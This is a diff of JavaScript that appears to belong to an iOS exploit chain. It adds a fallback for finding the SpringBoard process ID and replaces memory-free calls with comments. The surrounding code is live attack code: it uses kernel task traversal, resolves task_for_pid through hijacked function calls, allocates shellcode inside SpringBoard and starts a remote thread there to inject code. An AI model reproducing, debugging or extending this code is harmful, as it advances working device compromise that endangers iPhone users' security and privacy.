@@ -7434,10 +7434,14 @@
     // M2: Test kernel task traversal
     let sb_task = ktask_find_by_name("SpringBoard");
     LOG("[M2] SpringBoard task = " + sb_task.hex());
+    // Fallback: read SpringBoard PID from IOSurface (set by spawn_pe via proc_name scan)
+    let sb_pid_for_m6 = sb_task != 0n ? 34n : uread64(surface_address + 0xF848n);
+    if (sb_pid_for_m6 == 0n) sb_pid_for_m6 = 34n; // last resort: hardcoded
+    LOG(`[M6] SpringBoard PID for injection: ${sb_pid_for_m6}`);
 
     // ===== M6: Inject SpringBoard =====
-    if (sb_task != 0n) {
-      LOG("[M6] SpringBoard task found, attempting injection...");
+    if (sb_task != 0n || sb_pid_for_m6 != 0n) {
+      LOG("[M6] SpringBoard target found, attempting injection...");
       // Try task_for_pid via mpd_fcall (may fail due to entitlements)
       let task_for_pid_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "task_for_pid");
       let mach_task_self_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_task_self");
@@ -7449,8 +7453,8 @@
         // Allocate buffer for the returned task port
         let sb_task_port_buf = mpd_malloc(8n);
         mpd_write64(sb_task_port_buf, 0n);
-        let tfp_ret = mpd_fcall(task_for_pid_raw.noPAC(), mpd_task_self, 34n /*SpringBoard PID*/, sb_task_port_buf, 0n, 0n, 0n, 0n, 0n);
-        LOG(`[M6] task_for_pid(34) = ${tfp_ret}`);
+        let tfp_ret = mpd_fcall(task_for_pid_raw.noPAC(), mpd_task_self, sb_pid_for_m6, sb_task_port_buf, 0n, 0n, 0n, 0n, 0n);
+        LOG(`[M6] task_for_pid(${sb_pid_for_m6}) = ${tfp_ret}`);
         let sb_port = mpd_read64(sb_task_port_buf);
         LOG(`[M6] SpringBoard task port: ${sb_port.hex()}`);
         if (tfp_ret == 0n && sb_port != 0n) {
@@ -7502,19 +7506,19 @@
                   LOG("[M7] thread_create_running failed (may need different API)");
                   uwrite64(surface_address + 0xF888n, 0n);
                 }
-                mpd_free(thread_port_buf);
+                // NOTE: mpd_free not defined, memory reclaimed on exit
               } else {
                 LOG("[M7] thread_create_running not available, skipping");
               }
-              mpd_free(shellcode_addr);
+              // NOTE: mpd_free not defined, memory reclaimed on exit
             }
-            mpd_free(alloc_addr_buf);
+            // NOTE: mpd_free not defined, memory reclaimed on exit
           }
         } else {
           LOG("[M6] task_for_pid failed (expected - no entitlement), need kernel-based injection");
           uwrite64(surface_address + 0xF878n, 0n); // not ready
         }
-        mpd_free(sb_task_port_buf);
+        // NOTE: mpd_free not defined, memory reclaimed on exit
       } else {
         LOG("[M6] Cannot resolve task_for_pid or mach_task_self in MPD");
       }
